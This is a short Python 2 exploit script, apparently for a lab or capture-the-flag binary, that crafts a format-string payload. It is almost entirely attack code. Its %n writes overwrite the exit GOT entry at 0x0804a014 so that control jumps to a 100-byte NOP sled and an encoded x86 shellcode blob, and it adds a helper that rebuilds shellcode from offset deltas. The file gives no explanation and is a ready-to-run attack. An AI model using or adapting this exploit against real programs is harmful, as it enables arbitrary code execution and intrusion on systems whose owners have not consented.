#!/usr/bin/env python

#0x0804a014 R_386_JUMP_SLOT   exit@GLIBC_2.0

#0xffffc960 -> nopsled

#0x0804f19e <+126>:  pop    %edi

#0xffffc3b4
def make_shellcode(val=49):
    offsets = [ 143, -55, 58, -19, -153, 182, -77, -79, 161, -128, 22, 6, -63, 68, -11, 0, -57, 0, 51, 7, 32, 90, -145, 1, 54, 88, -84, -75, -55, 194, -77, ]

    beg = chr(val)
    shellcode = beg
    cur = ord(beg)
    for i in offsets:
        cur = cur + i
        shellcode += chr(cur)
    return shellcode

w1 = '\x14\xa0\x04\x08JUNK'
w2 = '\x15\xa0\x04\x08JUNK'
w3 = '\x16\xa0\x04\x08JUNK'
w4 = '\x17\xa0\x04\x08JUNK'
b1 = 0xb4
b2 = 0xc3
b3 = 0xff
b4 = 0xff

nopsled = '\x90' * 100
#shellcode = make_shellcode()

shellcode =  ""
shellcode += "\xb8\x58\x4e\xf7\x1a\xda\xd1\xd9\x74\x24\xf4\x5a\x29"
shellcode += "\xc9\xb1\x14\x31\x42\x14\x03\x42\x14\x83\xea\xfc\xba"
shellcode += "\xbb\xc6\xc1\xcd\xa7\x7a\xb5\x62\x42\x7f\xb0\x65\x22"
shellcode += "\x19\x0f\xe5\x18\xb8\xdd\x8d\x9c\x44\xf3\x11\xcb\x54"
shellcode += "\xa2\xf9\x82\xb4\x2e\x9f\xcc\xfb\x2f\xd6\xac\x07\x83"
shellcode += "\xec\x9e\x6e\x2e\x6c\x9d\xde\xd6\xa1\xa2\x8c\x4e\x53"
shellcode += "\x9c\xea\xbd\x23\xab\x73\xc6\x4b\x03\xab\x45\xe3\x33"
shellcode += "\x9c\xcb\x9a\xad\x6b\xe8\x0c\x61\xe5\x0e\x1c\x8e\x38"
shellcode += "\x50\x90\x90\x90"

n1 = 256 + b1 - 0x2e 
n2 = 2*256 + b2 - 0x2e - n1 
n3 = 3*256 + b3 - 0x2e - n1 - n2 
n4 = 4*256 + b4 - 0x2e - n1 - n2 - n3 

form = "%x%x%" + str(n1)
form += "x%n%" + str(n2)
form += "x%n%" + str(n3)
form += "x%n%" + str(n4) + "x%n"
print w1+w2+w3+w4+form+nopsled+shellcode
